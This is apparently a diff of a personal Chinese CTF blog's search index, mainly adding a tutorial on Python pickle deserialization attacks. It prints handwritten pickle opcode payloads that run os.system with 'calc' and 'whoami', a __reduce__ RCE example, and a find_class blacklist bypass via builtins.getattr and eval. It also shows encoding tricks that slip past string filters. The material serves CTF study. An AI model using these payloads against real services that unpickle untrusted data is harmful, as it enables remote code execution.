+<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
+<td>s</td>
+<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
+<td>无</td>
+</tr>
+<tr>
+<td>u</td>
+<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
+<td>u</td>
+<td>MARK标记以及被组合的数据出栈，字典被更新</td>
+<td>无</td>
+</tr>
+<tr>
+<td>a</td>
+<td>将栈的第一个元素append到第二个元素(列表)中</td>
+<td>a</td>
+<td>栈顶元素出栈，第二个元素（列表）被更新</td>
+<td>无</td>
+</tr>
+<tr>
+<td>e</td>
+<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
+<td>e</td>
+<td>MARK标记以及被组合的数据出栈，列表被更新</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<h2 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h2><p>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</p>
+<p>例如</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, num, passwd</span>):</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.num = num</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.passwd = passwd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;dir&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">x = B(<span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=pickle.dumps(x)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">pickletools.dis(payload)</span><br></pre></td></tr></table></figure>
+
+<p>输出为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x03dir\x94\x85\x94R\x94.&#x27;</span><br><span class="line">    0: \x80 PROTO      4</span><br><span class="line">    2: \x95 FRAME      27</span><br><span class="line">   11: \x8c SHORT_BINUNICODE &#x27;nt&#x27;</span><br><span class="line">   15: \x94 MEMOIZE    (as 0)</span><br><span class="line">   16: \x8c SHORT_BINUNICODE &#x27;system&#x27;</span><br><span class="line">   24: \x94 MEMOIZE    (as 1)</span><br><span class="line">   25: \x93 STACK_GLOBAL</span><br><span class="line">   26: \x94 MEMOIZE    (as 2)</span><br><span class="line">   27: \x8c SHORT_BINUNICODE &#x27;dir&#x27;</span><br><span class="line">   32: \x94 MEMOIZE    (as 3)</span><br><span class="line">   33: \x85 TUPLE1</span><br><span class="line">   34: \x94 MEMOIZE    (as 4)</span><br><span class="line">   35: R    REDUCE</span><br><span class="line">   36: \x94 MEMOIZE    (as 5)</span><br><span class="line">   37: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="pickle的利用"><a href="#pickle的利用" class="headerlink" title="pickle的利用"></a>pickle的利用</h2><ul>
+<li>任意代码执行或者命令执行</li>
+<li>变量覆盖</li>
+</ul>
+<h3 id="变量引用"><a href="#变量引用" class="headerlink" title="变量引用"></a>变量引用</h3><p>有点像php，如果知道目标有什么类，我们通过修改被反序列化的内容来进行引用危险变量。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">secret</span>:</span><br><span class="line">    pwd = <span class="string">&quot;hahaha&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.pwd = secret.pwd</span><br><span class="line">a=test()</span><br><span class="line"><span class="comment"># pickletools.optimize优化,更易读</span></span><br><span class="line">serialized = pickletools.optimize(pickle.dumps(test, protocol=<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(serialized)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>产生的字节码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\ntest\nc__builtin__\nobject\nNtR(dVpwd\nVhahaha\nsb.&#x27;   </span><br></pre></td></tr></table></figure>
+
+<p>当运行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 假设 secret 模块如下定义：</span></span><br><span class="line"><span class="comment"># secret.py</span></span><br><span class="line">pwd = <span class="string">&quot;s3cr3t&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的代码</span></span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.pwd = secret.pwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设这是已经序列化后的test类实例</span></span><br><span class="line">target = <span class="string">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\ntest\nc__builtin__\nobject\nNtR(dVpwd\ncsecret\npwd\nsb.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用pickle.loads反序列化target</span></span><br><span class="line">loaded_object = pickle.loads(target)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印反序列化对象的属性字典</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">vars</span>(loaded_object))</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;pwd&#x27;: &#x27;s3cr3t&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功引用。</p>
+<h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><h4 id="漏洞产生-reduce"><a href="#漏洞产生-reduce" class="headerlink" title="漏洞产生(__ reduce __)"></a>漏洞产生(__ reduce __)</h4><p>先看一个简单的代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, num, passwd</span>):</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.num = num</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.passwd = passwd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;dir&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment">#x = B(&#x27;123&#x27;, &#x27;password&#x27;)</span></span><br><span class="line"><span class="comment">#payload=pickle.dumps(x)</span></span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#pickletools.dis(payload)</span></span><br><span class="line">pickle._loads(<span class="string">b&#x27;\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x03dir\x94\x85\x94R\x94.&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>当执行这段代码时便会输出当前目录</p>
+<p>由</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x03dir\x94\x85\x94R\x94.&#x27;</span><br><span class="line">    0: \x80 PROTO      4</span><br><span class="line">    2: \x95 FRAME      27</span><br><span class="line">   11: \x8c SHORT_BINUNICODE &#x27;nt&#x27;</span><br><span class="line">   15: \x94 MEMOIZE    (as 0)</span><br><span class="line">   16: \x8c SHORT_BINUNICODE &#x27;system&#x27;</span><br><span class="line">   24: \x94 MEMOIZE    (as 1)</span><br><span class="line">   25: \x93 STACK_GLOBAL</span><br><span class="line">   26: \x94 MEMOIZE    (as 2)</span><br><span class="line">   27: \x8c SHORT_BINUNICODE &#x27;dir&#x27;</span><br><span class="line">   32: \x94 MEMOIZE    (as 3)</span><br><span class="line">   33: \x85 TUPLE1</span><br><span class="line">   34: \x94 MEMOIZE    (as 4)</span><br><span class="line">   35: R    REDUCE</span><br><span class="line">   36: \x94 MEMOIZE    (as 5)</span><br><span class="line">   37: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br></pre></td></tr></table></figure>
+
+<p><code>35: R    REDUCE</code>可以看到__ reduce __对应的是R指令，R选择栈上的第一个对象作为函数、第二个作为参数(第二个必须为元组)然后执行。查询得知R指令调用了load_reduce方法，查看源码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_reduce</span>(<span class="params">self</span>):</span><br><span class="line">    stack = <span class="variable language_">self</span>.stack</span><br><span class="line">    args = stack.pop()</span><br><span class="line">    func = stack[-<span class="number">1</span>]</span><br><span class="line">    stack[-<span class="number">1</span>] = func(*args)</span><br><span class="line">dispatch[REDUCE[<span class="number">0</span>]] = load_reduce</span><br></pre></td></tr></table></figure>
+
+<p>按照当前的例子说就是，取当前栈栈顶的元素标记位func，然后以args为参数，执行函数func，再把结果压进了当前栈中，即func对应例子中的system，而*args对应的是dir，导致了RCE。</p>
+<h3 id="为什么手动构造opcode"><a href="#为什么手动构造opcode" class="headerlink" title="为什么手动构造opcode"></a>为什么手动构造opcode</h3><p>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），这时我们就可以构造opcode来进行命令执行。因为版本0的opcode更方便阅读，所以手写一般用的是版本0.</p>
+<h3 id="常用操作符c，R，o。"><a href="#常用操作符c，R，o。" class="headerlink" title="常用操作符c，R，o。"></a>常用操作符c，R，o。</h3><h4 id="c"><a href="#c" class="headerlink" title="c"></a>c</h4><p>源码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_global</span>(<span class="params">self</span>):</span><br><span class="line">    module = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    name = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)<span class="comment">#获取moudle和name</span></span><br><span class="line">    klass = <span class="variable language_">self</span>.find_class(module, name)<span class="comment">#使用find_class()获取函数</span></span><br><span class="line">    <span class="variable language_">self</span>.append(klass)<span class="comment">#压栈</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">    <span class="comment"># Subclasses may override this.</span></span><br><span class="line">    sys.audit(<span class="string">&#x27;pickle.find_class&#x27;</span>, module, name)</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.proto &lt; <span class="number">3</span> <span class="keyword">and</span> <span class="variable language_">self</span>.fix_imports:</span><br><span class="line">        <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">            module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">        <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">            module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">    <span class="built_in">__import__</span>(module, level=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.proto &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure>
+
+<p><code>c</code>操作符把<code>find_class()</code>函数返回的一个类对象压入栈,通过<code>__import__()</code>引入了模块并且通过<code>self.proto</code>判断pickle版本处理了不同版本的函数名称问题.</p>
+<p><strong>举例</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造一个调用 os.system 的 pickle 数据（直接使用 c 操作符）</span></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;c__main__\nos\nsystem\n(cos\nsystem\nS&#x27;calc&#x27;\ntR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反汇编查看操作符</span></span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></table></figure>
+
+<p><strong>输出</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 0: c    GLOBAL     &#x27;__main__ os system&#x27;  # 导入 os.system</span><br><span class="line">19: (    MARK</span><br><span class="line">20: c        GLOBAL     &#x27;os system&#x27;       # 再次导入 os.system</span><br><span class="line">31: S        STRING     &#x27;calc&#x27;            # 参数字符串 &#x27;calc&#x27;</span><br><span class="line">38: t        TUPLE      (MARK at 19)      # 组成元组 (os.system, &#x27;calc&#x27;)</span><br><span class="line">39: R    REDUCE                          # 调用函数</span><br><span class="line">40: .    STOP</span><br></pre></td></tr></table></figure>
+
+<p><strong>效果</strong>：反序列化后会执行 <code>os.system(&quot;calc&quot;)</code>（弹出计算器）。</p>
+<h4 id="R"><a href="#R" class="headerlink" title="R"></a>R</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode=b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>cos<br>system<br>将os.system压入栈中<br>(<br>向栈中压入Mark<br>S’whoami’<br>将字符串whoami压入栈中<br>t寻找栈中的上一个Mark，并组合之间的数组为元组(‘whoami’)<br>R选择栈上的第一个对象作为函数、第二个作为参数(第二个必须为元组),<br>然后调用该函数os.system(‘whoami’)<br>点号结束</p>
+<h4 id="o"><a href="#o" class="headerlink" title="o"></a>o</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode=b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象)</p>
+<h4 id="i"><a href="#i" class="headerlink" title="i"></a>i</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode=b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;  </span><br></pre></td></tr></table></figure>
+
+<p>(S’whoami’Mark压入栈中，字符串压入栈中<br>ios\nsystem<br>i指令相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p>
+<h4 id="b"><a href="#b" class="headerlink" title="b"></a>b</h4><p>查看源码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_build</span>(<span class="params">self</span>):</span><br><span class="line">        stack = <span class="variable language_">self</span>.stack</span><br><span class="line">        state = stack.pop()</span><br><span class="line">        <span class="comment"># 首先获取栈上的字节码 b 前的一个元素，对于对象来说，该元素一般是存储有对象属性的dict</span></span><br><span class="line">        inst = stack[-<span class="number">1</span>]</span><br><span class="line">        <span class="comment">#获取该字典中键名为&quot;__setstate__&quot;的value</span></span><br><span class="line">        setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="comment">#如果存在，则执行value(state)</span></span><br><span class="line">        <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            setstate(state)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        slotstate = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">            state, slotstate = state</span><br><span class="line">        <span class="comment">#如果&quot;__setstate__&quot;为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并</span></span><br><span class="line">        <span class="keyword">if</span> state:<span class="comment">#如果state不是False,None,0或者非空序列,就步入</span></span><br><span class="line">            inst_dict = inst.__dict__</span><br><span class="line">            intern = sys.intern</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                    inst_dict[intern(k)] = v</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    inst_dict[k] = v</span><br><span class="line">        <span class="comment">#如果__setstate__和__getstate__都没有设置，则加载默认__dict__</span></span><br><span class="line">        <span class="keyword">if</span> slotstate:</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">                <span class="built_in">setattr</span>(inst, k, v)</span><br><span class="line">    dispatch[BUILD[<span class="number">0</span>]] = load_build</span><br></pre></td></tr></table></figure>
+
+<p>简单地说,<code>b</code>操作符有两种用法</p>
+<ol>
+<li>向一个实例中插入属性,或覆盖属性</li>
+<li>以一个实例的<code>__setstate__</code>属性为<code>func</code>,<code>b</code>的前一个元素当作<code>arg</code>,执行<code>func(arg)</code></li>
+</ol>
+<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>示例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Secret</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line"></span><br><span class="line">s=Secret(<span class="string">&quot;S1nKk&quot;</span>)</span><br><span class="line">opcode=<span class="string">b&quot;&quot;&quot;c__main__</span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Funny_M0nk3y&#x27;</span></span><br><span class="line"><span class="string">db.&quot;&quot;&quot;</span></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(s.name)</span><br><span class="line"><span class="comment"># pickletools.dis(opcode)</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>c__main__</code>：创建一个在 <code>__main__</code> 模块中定义的类的实例。</p>
+</li>
+<li><p><code>s</code>：表示接下来的操作是保存一个对象的字典（即实例的属性）。</p>
+</li>
+<li><p><code>(S&#39;name&#39;</code>：表示一个键，这里是字符串 <code>&#39;name&#39;</code>。</p>
+</li>
+<li><p><code>S&#39;Funny_M0nk3y&#39;</code>：表示一个值，这里是字符串 <code>&#39;Funny_M0nk3y&#39;</code>。</p>
+</li>
+<li><p><code>db.</code>：结束保存字典的操作，然后是 pickle 协议的结束标记。</p>
+<p>这时name的值便被修改为Funny_M0nk3y。</p>
+</li>
+</ul>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="find-class-中出现过滤"><a href="#find-class-中出现过滤" class="headerlink" title="find_class()中出现过滤"></a>find_class()中出现过滤</h4><p>有些题中通过在find_class()中加入黑白名单来防止调用危险函数</p>
+<p><strong>绕过方法</strong></p>
+<p>通过使用builtins模块构造getattr函数，不再经过find_class，就能绕过WAF实现任意函数执行。</p>
+<p><strong>builtins模块</strong>：<br><code>builtins</code> 是 Python 的内置模块，包含所有内置函数和类（如 <code>getattr</code>、<code>str</code>、<code>dict</code> 等）。攻击者可能通过它间接访问危险函数。</p>
+<p><strong>getattr：</strong></p>
+<p><code>getattr</code> 是 <code>builtins</code> 模块中的一个函数，用于从对象中获取指定的属性。</p>
+<p><strong>示例：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">builtins.getattr(builtins.getattr(builtins.dict,&#x27;get&#x27;)(builtins.golbals(),&#x27;builtins&#x27;),&#x27;eval&#x27;)(command)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>builtins.dict: 这是Python内置的 <code>dict</code> 类。</p>
+</li>
+<li><p>builtins.getattr(builtins.dict, ‘get’): 这里使用 <code>getattr</code> 函数来获取 <code>dict</code> 类的 <code>get</code> 方法。<code>get</code> 方法是字典对象的一个方法，用于获取指定键的值，如果键不存在，则返回默认值（如果没有提供默认值，则返回 <code>None</code>）。</p>
+</li>
+<li><p>builtins.getattr(builtins.dict, ‘get’)(builtins.globals(), ‘builtins’): 这一步执行了上一步获取的 <code>get</code> 方法。<code>builtins.globals()</code> 返回当前全局符号表，这是一个字典，包含了当前全局范围内的所有变量。然后，我们使用 <code>get</code> 方法从这个全局字典中获取键 <code>&#39;builtins&#39;</code> 的值。在全局字典中，键 <code>&#39;builtins&#39;</code> 对应的是 <code>builtins</code> 模块本身。</p>
+</li>
+<li><p>builtins.getattr(…, ‘eval’): 最后，我们再次使用 <code>getattr</code> 函数，这次是从上一步返回的 <code>builtins</code> 模块中获取 <code>&#39;eval&#39;</code> 属性。<code>eval</code> 是一个内置函数，它能够执行一个字符串作为Python代码。</p>
+<p>5.<code>(command)</code>: 最后，我们将 <code>command</code> 作为参数传递给 <code>eval</code> 函数。这意味着 <code>command</code> 字符串将被当作Python代码执行。</p>
+</li>
+</ol>
+<p>难点在于如何转化成opcode，这里我们可以借助pker的辅助来进行生成。</p>
+<p>写成opcode就是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geteval = b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(cbuiltins</span><br><span class="line">dict</span><br><span class="line">S&#x27;get&#x27;</span><br><span class="line">tR(cbuiltins</span><br><span class="line">globals</span><br><span class="line">)RS&#x27;__builtins__&#x27;</span><br><span class="line">tRS&#x27;eval&#x27;</span><br><span class="line">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="line">tR.</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过显式字符串检测"><a href="#绕过显式字符串检测" class="headerlink" title="绕过显式字符串检测"></a>绕过显式字符串检测</h4><p><code>V</code>操作符可以进行unicode编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vsecr\u0065t</span><br><span class="line">#secret</span><br></pre></td></tr></table></figure>
+
+<p><code>S</code>操作符可以识别十六进制</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S&#x27;\x73ecret&#x27;</span><br><span class="line">#secret</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>GHCTF</tag>
       </tags>
   </entry>
   <entry>
@@ -683,12 +1021,6 @@
       <tags>
         <tag>upload-labs</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>博客的创建</title>
-    <url>/2024/08/04/%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%88%9B%E5%BB%BA/</url>
-    <content><![CDATA[<p>搭建过程：<br>    先本地连接GitHub，再在GitHub里创建仓库，然后本地安装hexo，最后将hexo程序上传到GitHub。<br>遇到问题：<br>    1. 初始化hexo时弄错了文件夹<br>      解决：找到hexo程序所在文件夹使用git base初始化<br>    2：上传hexo时出现找不到github的邮箱和用户名的问题<br>      解决：网上寻找，在.deploy-git中的子文件.git找到config，并输入你的邮箱与用户名就可以解决<br>    &#x2F;&#x2F;之前出错的截图没了<br>    3：无法插入图片<br>      解决：b站（<a href="https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>      在source中创建images文件并将你需要的图片放入然后就可以在md文件中引用图片</p>
-]]></content>
   </entry>
   <entry>
     <title>upload1-10</title>
@@ -892,6 +1224,12 @@
       </tags>
   </entry>
   <entry>
+    <title>博客的创建</title>
+    <url>/2024/08/04/%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%88%9B%E5%BB%BA/</url>
+    <content><![CDATA[<p>搭建过程：<br>    先本地连接GitHub，再在GitHub里创建仓库，然后本地安装hexo，最后将hexo程序上传到GitHub。<br>遇到问题：<br>    1. 初始化hexo时弄错了文件夹<br>      解决：找到hexo程序所在文件夹使用git base初始化<br>    2：上传hexo时出现找不到github的邮箱和用户名的问题<br>      解决：网上寻找，在.deploy-git中的子文件.git找到config，并输入你的邮箱与用户名就可以解决<br>    &#x2F;&#x2F;之前出错的截图没了<br>    3：无法插入图片<br>      解决：b站（<a href="https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>      在source中创建images文件并将你需要的图片放入然后就可以在md文件中引用图片</p>
+]]></content>
+  </entry>
+  <entry>
     <title>报错注入</title>
     <url>/2024/12/25/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h1><p>见less5</p>
@@ -913,6 +1251,44 @@
       <tags>
         <tag>sqlilab注入 web</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>攻防世界</title>
+    <url>/2024/12/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
+    <content><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p><strong>概念：</strong></p>
+<p>PHP序列化（函数为<code>serialize</code>）是一种将复杂数据结构（如对象和数组）转换成字符串的过程，以便于存储或传递数据，但仅保留对象里的成员变量，不保留函数方法。</p>
+<p>举例：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$person</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&#x27;is_employee&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>serialize()</code> 函数序列化这个数组后长这样。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;张三&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">30</span>;s:<span class="number">10</span>:<span class="string">&quot;is_employee&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PHP反序列化标识符含义：</p>
+<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - <span class="type">boolean</span></span><br><span class="line">d - <span class="type">double</span></span><br><span class="line">i - <span class="type">integer</span></span><br><span class="line">o - common <span class="type">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="type">string</span></span><br><span class="line">C - <span class="keyword">custom</span> <span class="type">object</span></span><br><span class="line">O - <span class="keyword">class</span></span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - <span class="keyword">unicode</span> <span class="type">string</span></span><br></pre></td></tr></table></figure>
+
+<p>反序列化（函数为<code>unserilize</code>）可以将序列化生成的字符串重新还原为对象中的成员属性。</p>
+<p><strong>原理：</strong></p>
